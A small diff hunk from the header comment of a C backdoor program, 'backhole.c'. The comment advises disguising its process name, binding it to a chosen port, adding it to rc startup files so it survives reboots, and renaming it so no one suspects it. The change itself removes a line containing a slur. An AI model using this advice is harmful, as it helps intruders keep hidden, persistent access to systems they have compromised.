@@ -7,7 +7,7 @@
    it to run as under 'ps' and what port to bind to in the defines below.
    The smart thing to do would be to put this into the rc files so it will
    start up if they find you and reboot. I'd also change it's name to
-   something no one will suspect. PS. if you think this is gay, fuck you..
+   something no one will suspect.
 
    to complie:
    # gcc backhole.c -o backhole 
